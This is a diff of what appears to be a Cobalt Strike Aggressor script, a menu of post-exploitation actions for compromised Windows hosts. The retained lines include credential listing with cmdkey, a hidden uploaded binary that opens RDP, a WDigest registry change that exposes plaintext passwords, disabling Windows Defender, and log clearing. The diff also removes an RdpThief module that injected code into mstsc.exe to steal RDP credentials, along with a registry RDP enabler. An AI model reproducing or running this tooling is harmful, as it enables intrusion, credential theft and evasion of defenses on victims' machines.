@@ -72,7 +72,7 @@ item "SharpZip(压缩文件夹)" {
     $arg = join(' ', @($3['bucketName'],$3['accessKeyId'],$3['accessKeySecret'],$3['endpoint'],$3['UploadFilePath']));
     bexecute_assembly($bid, script_resource("/modules/Assist/SharpOSS.exe"), $arg);
   }
-	item "获取远程连接主机的密码" {
+	item "获取远程连接主机的密码" {#简单提示,未完成
 			show_message("没有管理员权限不能够获取到加密的密钥");
 			binput($1,"shell cmdkey /list");
 			bshell($1,"cmdkey /list");
@@ -87,20 +87,8 @@ item "SharpZip(压缩文件夹)" {
 	}
 	separator();
 
-	item "开启远程桌面" {
-	if( -isadmin $1['@'] )
-	{
-		bshell($1,"REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f");
-		bshell($1,"REG ADD \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v PortNumber /t REG_DWORD /d 0x00000d3d /f");
-	}
-	else
-	{
-		show_error("Permission Denied!");
-	}
-
-	}
 	separator();
-	item "开启远程桌面(Win_Api)" {
+	item "开启远程桌面(Win_Api)" {#
 			bupload($1,script_resource("./modules/Assist/reg_open_3389.exe"));
 			bshell($1,"attrib reg_open_3389.exe +s +h");
 			bshell($1,"reg_open_3389.exe");
@@ -109,7 +97,7 @@ item "SharpZip(压缩文件夹)" {
 	item "启用Wdigest保存明文口令" {
 		if (-isadmin $1["@"])
 		{
-						binput($1["@"],"reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f");
+			binput($1["@"],"reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f");
 			bshell($1["@"],"reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f");
 		}
 		else
@@ -125,21 +113,7 @@ item "SharpZip(压缩文件夹)" {
         bshell($1, "reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" /v \"DisableAntiSpyware\" /d 1 /t REG_DWORD");
       }
     }
-   menu "RdpThief"{
-        item "开启Rdpthief"{
-            blog($1, "RdpThief enabled \n");
-            add(@beacons,$1,0);
-        }
-
-        item "关闭Rdpthief"{
-            blog($1, "Disabling RdpThief");
-            remove(@beacons,$1);
-        }
-
-        item "提取Rdpthief记录"{
-            bshell($1,"type %temp%\\data.bin");
-        }
-    }
+separator();
 	menu "日志清除" {
   item "清除系统日志" {
     prompt_text("再次确认清除系统日志：", "请详细阅读网络安全法", lambda({
@@ -171,37 +145,4 @@ item "SharpZip(压缩文件夹)" {
 
   }
 
-}
-
-@beacons = @();
-@pids = @();
-
-on heartbeat_5s{
-
-    foreach $index => $beaconid (@beacons)
-    {
-       
-        bps($beaconid,&handleProcess);
-    } 
-
-}
-
-
-sub handleProcess{
-  
-  $processList = $2;
-  $index = indexOf($processList, "mstsc.exe", 0) + 9;
-
-  if($index > 9){
-
-    $temp = substr($processList,$index,-1);
-    $pid = split("\t",$temp)[2];
-
-    if ($pid !in @pids){
-      add(@pids,$pid,0);
-      blog($1,"Injecting into mstsc.exe with PID: $pid");
-      bshinject($1, $pid , "x64" ,script_resource("/modules/Assist/RdpThief_x64.tmp"));
-    }
-    
-  }
 }
